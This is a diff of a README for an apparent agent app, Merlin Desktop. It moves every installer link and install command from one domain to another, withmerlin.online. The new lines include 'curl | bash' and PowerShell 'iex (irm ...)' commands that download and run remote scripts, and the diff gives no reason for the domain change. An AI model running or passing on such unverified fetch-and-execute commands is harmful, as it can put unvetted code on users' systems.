@@ -20,7 +20,7 @@ The simplest path: a one-click installer with a guided, point-and-click setup. N
 
 ### 1. Download and install
 
-[Download the Merlin Desktop installer](https://merlin-agent.epinoiahorizon.com/) for macOS or Windows, then open it. On first launch it finishes setting itself up (usually under a minute).
+[Download the Merlin Desktop installer](https://withmerlin.online/) for macOS or Windows, then open it. On first launch it finishes setting itself up (usually under a minute).
 
 ### 2. Connect Atlas Portal
 
@@ -49,16 +49,16 @@ Prefer the terminal?
 On macOS/Linux/WSL2/Android, run
 
 ```bash
-curl -fsSL https://merlin-agent.epinoiahorizon.com/install.sh | bash
+curl -fsSL https://withmerlin.online/install.sh | bash
 ```
 
 On Windows, run
 
 ```powershell
-iex (irm https://merlin-agent.epinoiahorizon.com/install.ps1)
+iex (irm https://withmerlin.online/install.ps1)
 ```
 
-Prefer to review first? Download [`install.sh`](https://merlin-agent.epinoiahorizon.com/install.sh), inspect it, then run it.
+Prefer to review first? Download [`install.sh`](https://withmerlin.online/install.sh), inspect it, then run it.
 
 After it finishes, reload your shell:
 
